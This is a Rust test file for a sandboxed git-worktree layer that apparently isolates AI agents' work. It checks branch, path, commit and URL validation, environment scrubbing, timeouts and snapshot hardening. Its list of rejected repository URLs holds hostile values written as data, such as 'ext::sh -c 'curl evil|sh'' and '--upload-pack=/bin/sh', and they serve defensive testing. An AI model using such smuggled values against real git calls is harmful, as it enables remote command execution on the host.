use super::*;

#[test]
fn branch_names_are_strict_agent_ids() {
    assert!(validate_branch("agent-ffffffff-ffff-ffff-ffff-ffffffffffff").is_ok());
    assert!(validate_branch("agent-abc").is_ok());
    assert!(validate_branch("main").is_err());
    assert!(validate_branch("agent-../../etc").is_err());
    assert!(validate_branch("feature/x").is_err());
}

#[test]
fn worktree_paths_stay_under_the_root() {
    let root = Path::new("/tmp/worktrees");
    let ok = safe_worktree_path(root, "agent-11111111-2222-3333-4444-555555555555").unwrap();
    assert_eq!(ok, root.join("agent-11111111-2222-3333-4444-555555555555"));
    assert!(safe_worktree_path(root, "../escape").is_err());
    assert!(safe_worktree_path(root, "a/b").is_err());
}

#[test]
fn commits_are_hex_and_length_bounded() {
    let ok = "a".repeat(40);
    assert!(validate_commit(&ok).is_ok());
    assert!(validate_commit(&"a".repeat(39)).is_err());
    assert!(validate_commit(&"z".repeat(40)).is_err());
    assert!(validate_commit(&"a".repeat(65)).is_err());
}

#[test]
fn repository_urls_are_allowlisted_by_scheme() {
    assert!(validate_repository_url("https://example.invalid/a/b.git").is_ok());
    assert!(validate_repository_url("file:///srv/mirrors/a.git").is_ok());

    for rejected in [
        // Remote helpers: `ext::` runs whatever follows it.
        "ext::sh -c 'curl evil|sh'",
        "ext::git-upload-pack",
        // scp-style syntax, which git accepts and which selects ssh.
        "git@example.invalid:a/b.git",
        "example.invalid:a/b.git",
        // Schemes whose transport is not reviewed here.
        "ssh://example.invalid/a.git",
        "git://example.invalid/a.git",
        "http://example.invalid/a.git",
        "ftp://example.invalid/a.git",
        // Option smuggling.
        "--upload-pack=/bin/sh",
        "-u/bin/sh",
        // Credentials in argv.
        "https://user:token@example.invalid/a.git",
        // Degenerate input.
        "",
        "https://",
        "https://example.invalid/a\nb",
    ] {
        assert!(
            validate_repository_url(rejected).is_err(),
            "{rejected:?} was accepted"
        );
    }
}

#[test]
fn a_clone_never_reaches_git_with_a_rejected_url() {
    struct Recording(std::sync::Mutex<Vec<String>>);
    impl GitRunner for Recording {
        fn run(&self, _repo: &Path, args: &[&str]) -> Result<String, String> {
            self.0.lock().unwrap().push(args.join(" "));
            Ok(String::new())
        }
        fn run_cwd(&self, _cwd: &Path, args: &[&str]) -> Result<String, String> {
            self.0.lock().unwrap().push(args.join(" "));
            Ok(String::new())
        }
    }
    let runner = Recording(std::sync::Mutex::new(Vec::new()));
    let dir = std::env::temp_dir().join(format!("clone-policy-{}", std::process::id()));
    std::fs::create_dir_all(&dir).unwrap();
    let error = ensure_main_checkout(&runner, &dir.join("project"), Some("ext::sh -c 'id'"), None)
        .unwrap_err();
    assert!(matches!(error, WorktreeError::UnsafeUrl(_)), "{error}");
    assert!(
        runner.0.lock().unwrap().is_empty(),
        "git must not be invoked at all: {:?}",
        runner.0.lock().unwrap()
    );
    std::fs::remove_dir_all(&dir).ok();
}

#[test]
fn a_clone_terminates_options_before_the_url() {
    struct Recording(std::sync::Mutex<Vec<String>>);
    impl GitRunner for Recording {
        fn run(&self, _repo: &Path, args: &[&str]) -> Result<String, String> {
            self.0.lock().unwrap().push(args.join(" "));
            Ok(String::new())
        }
        fn run_cwd(&self, _cwd: &Path, args: &[&str]) -> Result<String, String> {
            self.0.lock().unwrap().push(args.join(" "));
            Ok(String::new())
        }
    }
    let runner = Recording(std::sync::Mutex::new(Vec::new()));
    let dir = std::env::temp_dir().join(format!("clone-args-{}", std::process::id()));
    std::fs::create_dir_all(&dir).unwrap();
    ensure_main_checkout(
        &runner,
        &dir.join("project"),
        Some("https://example.invalid/a.git"),
        None,
    )
    .unwrap();
    let calls = runner.0.lock().unwrap().clone();
    let clone = calls
        .iter()
        .find(|call| call.starts_with("clone"))
        .expect("a clone was issued");
    let separator = clone.find(" -- ").expect("options are terminated");
    let url = clone.find("https://").expect("the url is present");
    assert!(separator < url, "`--` must precede the url: {clone}");
    std::fs::remove_dir_all(&dir).ok();
}

#[test]
fn the_git_command_runs_with_a_scrubbed_environment() {
    let git = CommandGit::new("git");
    let command = git.command(Path::new("/tmp"));
    let envs: std::collections::HashMap<_, _> = command
        .get_envs()
        .map(|(key, value)| {
            (
                key.to_string_lossy().into_owned(),
                value.map(|v| v.to_string_lossy().into_owned()),
            )
        })
        .collect();
    // Config discovery is disabled and prompts are impossible.
    assert_eq!(
        envs.get("GIT_CONFIG_NOSYSTEM").and_then(|v| v.as_deref()),
        Some("1")
    );
    assert_eq!(
        envs.get("GIT_TERMINAL_PROMPT").and_then(|v| v.as_deref()),
        Some("0")
    );
    assert_eq!(envs.get("GIT_ASKPASS").and_then(|v| v.as_deref()), Some(""));
    // Clearing the environment must prevent inherited Git command/configuration overrides.
    assert!(!envs.contains_key("GIT_SSH_COMMAND"));
    assert!(!envs.contains_key("GIT_EXTERNAL_DIFF"));
    let args: Vec<_> = command
        .get_args()
        .map(|arg| arg.to_string_lossy().into_owned())
        .collect();
    assert!(
        args.windows(2)
            .any(|pair| pair == ["-c", "protocol.allow=never"]),
        "protocols are default-deny: {args:?}"
    );
}

#[test]
fn a_hanging_git_is_killed_at_the_timeout() {
    use std::os::unix::fs::PermissionsExt;
    let dir = tempfile::tempdir().unwrap();
    let program = dir.path().join("hanging-git");
    // Ignore Git's arguments: GNU yes rejects -c, unlike BSD yes.
    std::fs::write(&program, "#!/bin/sh\nexec yes\n").unwrap();
    std::fs::set_permissions(&program, std::fs::Permissions::from_mode(0o700)).unwrap();
    let git = CommandGit::new(program.to_string_lossy())
        .with_timeout(std::time::Duration::from_millis(150));
    let started = std::time::Instant::now();
    let error = git.run(dir.path(), &["hang"]).unwrap_err();
    assert!(error.contains("timed out"), "{error}");
    assert!(
        started.elapsed() < std::time::Duration::from_secs(5),
        "the timeout must actually fire"
    );
}

#[test]
fn the_runtime_can_commit_without_any_ambient_git_identity() {
    // A fixed identity must allow commits after host configuration is scrubbed, including machines without a domain-qualified hostname.
    if !std::path::Path::new("/usr/bin/git").exists()
        && !std::path::Path::new("/usr/local/bin/git").exists()
    {
        eprintln!("skipping: no git on PATH");
        return;
    }
    // Use a process-scoped temporary repository and remove it after the test.
    let repository = std::env::temp_dir().join(format!(
        "spark-commit-identity-{}-{:?}",
        std::process::id(),
        std::thread::current().id()
    ));
    let _ = std::fs::remove_dir_all(&repository);
    std::fs::create_dir_all(&repository).unwrap();
    let git = CommandGit::new("git");
    git.run_cwd(&repository, &["init", "-b", "main"]).unwrap();
    git.run(
        &repository,
        &["commit", "--allow-empty", "-m", "spark: initial"],
    )
    .expect("the runtime must be able to commit with no host identity");
    let head = git.run(&repository, &["rev-parse", "HEAD"]).unwrap();
    assert_eq!(head.len(), 40, "HEAD must resolve: {head}");
    let author = git
        .run(&repository, &["log", "-1", "--format=%an <%ae>"])
        .unwrap();
    assert_eq!(author, format!("{COMMIT_NAME} <{COMMIT_EMAIL}>"));
    let _ = std::fs::remove_dir_all(&repository);
}

#[test]
fn command_git_is_a_real_boundary_and_scripter() {
    struct Script;
    impl GitRunner for Script {
        fn run(&self, _repo: &Path, args: &[&str]) -> Result<String, String> {
            Ok(format!("ran {}", args.join(" ")))
        }
        fn run_cwd(&self, _cwd: &Path, args: &[&str]) -> Result<String, String> {
            Ok(format!("cwd {}", args.join(" ")))
        }
    }
    let dir = std::env::temp_dir().join(format!("wt-{}", std::process::id()));
    std::fs::create_dir_all(&dir).unwrap();
    let w = create_agent_worktree(
        &Script,
        Path::new("/main"),
        &dir,
        Uuid::new_v4(),
        &"b".repeat(40),
    )
    .unwrap();
    assert!(w.to_string_lossy().starts_with(&dir.display().to_string()));
}
#[test]
fn large_successful_diff_is_drained_before_waiting_for_exit() {
    let dir = tempfile::tempdir().unwrap();
    let git = CommandGit::new("git").with_timeout(std::time::Duration::from_secs(2));
    git.run_cwd(dir.path(), &["init", "-b", "main"]).unwrap();
    std::fs::write(dir.path().join("large.txt"), "old line\n".repeat(40_000)).unwrap();
    git.run(dir.path(), &["add", "large.txt"]).unwrap();
    git.run(dir.path(), &["commit", "-m", "base"]).unwrap();
    std::fs::write(dir.path().join("large.txt"), "new line\n".repeat(40_000)).unwrap();
    let diff = git.run(dir.path(), &["diff", "--no-ext-diff"]).unwrap();
    assert!(diff.len() > 400_000);
}

#[test]
fn isolated_worktree_git_survives_a_different_mount_path() {
    let dir = tempfile::tempdir().unwrap();
    let main = dir.path().join("main");
    std::fs::create_dir(&main).unwrap();
    let git = CommandGit::new("git");
    ensure_main_checkout(&git, &main, None, None).unwrap();
    git.run(&main, &["commit", "--allow-empty", "-m", "base"])
        .unwrap();
    let base = git.run(&main, &["rev-parse", "HEAD"]).unwrap();
    let worktree = create_agent_worktree(
        &git,
        &main,
        &dir.path().join("worktrees"),
        Uuid::new_v4(),
        &base,
    )
    .unwrap();
    assert!(
        worktree.join(".git").is_dir(),
        "a container needs self-contained Git metadata"
    );
    let moved = dir.path().join("container-workspace");
    std::fs::rename(&worktree, &moved).unwrap();
    std::fs::remove_dir_all(&main).unwrap();
    git.run(&moved, &["status", "--porcelain"]).unwrap();
    std::fs::write(moved.join("new.txt"), "container edit").unwrap();
    git.run(&moved, &["add", "new.txt"]).unwrap();
    git.run(&moved, &["commit", "-m", "container commit"])
        .unwrap();
}

#[test]
fn noisy_failing_git_drains_both_pipes_and_bounds_capture() {
    use std::os::unix::fs::PermissionsExt;
    let dir = tempfile::tempdir().unwrap();
    let program = dir.path().join("noisy-git");
    std::fs::write(&program, "#!/bin/sh\ndd if=/dev/zero bs=65536 count=20 2>/dev/null\ndd if=/dev/zero bs=65536 count=20 1>&2 2>/dev/null\nexit 7\n").unwrap();
    std::fs::set_permissions(&program, std::fs::Permissions::from_mode(0o700)).unwrap();
    let git =
        CommandGit::new(program.to_string_lossy()).with_timeout(std::time::Duration::from_secs(3));
    let error = git.run(dir.path(), &["ignored"]).unwrap_err();
    assert_eq!(error.len(), GIT_OUTPUT_CAP);
}

#[test]
fn host_git_reads_data_without_sandbox_configuration_or_indirections() {
    let dir = tempfile::tempdir().unwrap();
    let git = CommandGit::new("git");
    git.run_cwd(dir.path(), &["init", "-b", "main"]).unwrap();
    git.run(dir.path(), &["commit", "--allow-empty", "-m", "base"])
        .unwrap();
    let expected = git.run(dir.path(), &["rev-parse", "HEAD"]).unwrap();
    git.run(dir.path(), &["config", "reviewprobe.source", "sandbox"])
        .unwrap();
    assert_eq!(
        git.run(dir.path(), &["config", "--get", "reviewprobe.source"])
            .unwrap(),
        "sandbox"
    );
    assert!(
        git.run_isolated(dir.path(), &["config", "--get", "reviewprobe.source"])
            .is_err()
    );
    std::fs::write(dir.path().join(".git/commondir"), "/unused-control-path\n").unwrap();
    assert_eq!(
        git.run_isolated(dir.path(), &["rev-parse", "HEAD"])
            .unwrap(),
        expected
    );
    assert!(
        git.run_isolated(dir.path(), &["status", "--porcelain"])
            .unwrap()
            .is_empty()
    );
    let args: Vec<_> = git
        .command(dir.path())
        .get_args()
        .map(|arg| arg.to_string_lossy().into_owned())
        .collect();
    for disabled in [
        "core.hooksPath=/dev/null",
        "core.fsmonitor=false",
        "commit.gpgSign=false",
        "tag.gpgSign=false",
    ] {
        assert!(args.iter().any(|argument| argument == disabled));
    }
}

#[test]
fn review_snapshot_refuses_symlinks_and_omits_object_alternates() {
    let dir = tempfile::tempdir().unwrap();
    let git = CommandGit::new("git");
    git.run_cwd(dir.path(), &["init", "-b", "main"]).unwrap();
    git.run(dir.path(), &["commit", "--allow-empty", "-m", "base"])
        .unwrap();
    std::fs::write(
        dir.path().join(".git/objects/info/alternates"),
        "/unused-object-path\n",
    )
    .unwrap();
    let snapshot = crate::git_snapshot::snapshot(dir.path()).unwrap();
    assert!(!snapshot.path().join("objects/info/alternates").exists());
    let reference = dir.path().join(".git/refs/heads/main");
    let content = std::fs::read(&reference).unwrap();
    let outside = dir.path().join("outside-ref");
    std::fs::write(&outside, content).unwrap();
    std::fs::remove_file(&reference).unwrap();
    std::os::unix::fs::symlink(outside, reference).unwrap();
    assert!(crate::git_snapshot::snapshot(dir.path()).is_err());
}
#[test]
#[ignore = "requires Docker and SPARK_PROJECT_GIT_TEST_IMAGE set to an available digest-pinned Git image"]
fn project_git_works_inside_the_actual_helper_launch_layout() {
    use spark_privd::backend::DockerBackend;
    use spark_privd::protocol::PrivilegedOperation;
    let image = std::env::var("SPARK_PROJECT_GIT_TEST_IMAGE").expect("set the pinned test image");
    let dir = tempfile::tempdir().unwrap();
    let main = dir.path().join("main");
    std::fs::create_dir(&main).unwrap();
    let git = CommandGit::new("git");
    ensure_main_checkout(&git, &main, None, None).unwrap();
    git.run(&main, &["commit", "--allow-empty", "-m", "protected base"])
        .unwrap();
    let base = git.run(&main, &["rev-parse", "HEAD"]).unwrap();
    let id = Uuid::new_v4();
    let worktree =
        create_agent_worktree(&git, &main, &dir.path().join("worktrees"), id, &base).unwrap();
    let backend = DockerBackend::new("docker", true)
        .with_paths(dir.path().join("models"), dir.path().join("run"))
        .with_service_uid(nix::unistd::getuid().as_raw())
        .with_service_gid(nix::unistd::getgid().as_raw());
    let plan = backend
        .plan_start_project_container(&PrivilegedOperation::StartProjectContainer {
            request_id: Uuid::new_v4(),
            project_id: Uuid::new_v4(),
            worktree_id: id,
            image_digest: image,
            workspace_host_path: worktree.display().to_string(),
            forward_ports: vec![],
        })
        .unwrap();
    let name = format!("spark-project-{id}");
    struct Cleanup(String);
    impl Drop for Cleanup {
        fn drop(&mut self) {
            let _ = std::process::Command::new("docker")
                .args(["rm", "-f", &self.0])
                .output();
        }
    }
    let _cleanup = Cleanup(name.clone());
    let launched = std::process::Command::new(&plan.argv[0])
        .args(&plan.argv[1..])
        .args(["sleep", "60"])
        .output()
        .unwrap();
    assert!(
        launched.status.success(),
        "{}",
        String::from_utf8_lossy(&launched.stderr)
    );
    let exec = |arguments: &[&str]| {
        let output = std::process::Command::new("docker")
            .args(["exec", "--workdir=/workspace", &name])
            .args(arguments)
            .output()
            .unwrap();
        assert!(
            output.status.success(),
            "{arguments:?}: {}",
            String::from_utf8_lossy(&output.stderr)
        );
        String::from_utf8_lossy(&output.stdout).trim().to_owned()
    };
    assert_eq!(exec(&["git", "status", "--porcelain"]), "");
    exec(&["touch", "container-change.txt"]);
    exec(&["git", "add", "container-change.txt"]);
    exec(&[
        "git",
        "-c",
        "user.name=Test",
        "-c",
        "user.email=test@spark.invalid",
        "commit",
        "-m",
        "container change",
    ]);
    assert_eq!(exec(&["git", "status", "--porcelain"]), "");
    assert!(!main.join("container-change.txt").exists());
    assert_eq!(git.run(&main, &["rev-parse", "HEAD"]).unwrap(), base);
    let head = git.run_isolated(&worktree, &["rev-parse", "HEAD"]).unwrap();
    git.import_reviewed(&main, &worktree, &head, &agent_branch_name(id))
        .unwrap();
    squash_merge(
        &git,
        &main,
        &agent_branch_name(id),
        "reviewed",
        "Test <test@spark.invalid>",
    )
    .unwrap();
    assert!(main.join("container-change.txt").exists());
}
